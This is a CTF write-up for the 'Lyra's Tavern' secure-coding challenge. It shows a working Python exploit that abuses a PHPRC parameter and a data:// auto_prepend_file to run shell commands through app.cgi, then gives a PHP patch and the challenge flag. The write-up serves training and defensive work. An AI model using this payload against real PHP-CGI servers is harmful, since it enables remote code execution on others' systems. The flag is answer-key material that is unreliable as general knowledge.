# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Lyra's Tavern
> Lyra's Tavern is a simple and adventurous place for the common day adventurer to rest and get some drinks while having entertainment. She recently released a system for adventurers to share their experiences in form of chronicles. However, there has been evidence of backdoor access on the server forcing her to isolate it for maintenance. She has trusted you with the source code to find and fix any vulnerability evident within the system. Can you undertake this crucial task and assist us to give the adventurers this unique experience ? A handsome reward awaits ;)


- **Category**: Secure Coding 
- **Difficulty**: Easy
- **Author**: Cioppo


## Writeup


The exploits creates a file ``out.txt`` with the output of the command ``id`` in our application directory and the it gets that file.
```py
payload = b'<? shell_exec("id > /www/application/out.txt"); ?>'
data_url = f"data://text/plain;base64,{base64.b64encode(payload).decode()}"
data = {
    "data":urllib.parse.quote(f"allow_url_include=1\nauto_prepend_file=\"{data_url}\"")
}

response = requests.post(f"{URL}/cgi-bin/app.cgi?PHPRC=/dev/fd/0", data=data)
print("[*] HTTP Status:", response.status_code)
response = requests.get(f"{URL}/out.txt")
```
This happens because there is a app.cgi in this program whose purpose is to run config.php and it gives it the data that got passed to app.cgi. 
In out program this is used to make a footer (???), our application gives app.cgi proper_config.ini as it's phprc, but app.cgi just checks if the files exists and nothing else. We can make a super easy fix by just checking if the ``$phprc`` variable is set to that file, because why wouldn't it be? (we could hard code it but this way we keep functionality, not the best fix but it gets the flag)
```php
<?php
header("Content-Type: text/html");
header("Status: 200 OK");
echo "\r\n";

$phprc = isset($_REQUEST['PHPRC']) ? $_REQUEST['PHPRC'] : null;
$data = isset($_REQUEST['data']) ? $_REQUEST['data'] : null;

if (!is_null($phprc) && !is_null($data)) {

    $data = urldecode($data);

    if ( $phprc != "/tmp/php_config/proper_config.ini" ) {
        echo "Naughty Naughty!";
        exit;
    }
    if (!file_exists($phprc) || !file_exists("/www/application/config.php")) {
        echo "File not found: " . htmlspecialchars($phprc);
        exit;
    }
    // ...
```

>HTB{N0W_Y0U_S33_M3_N0W_Y0U_D0NT!@_b9d4826ac43a24155b02204a8ff3ec9a}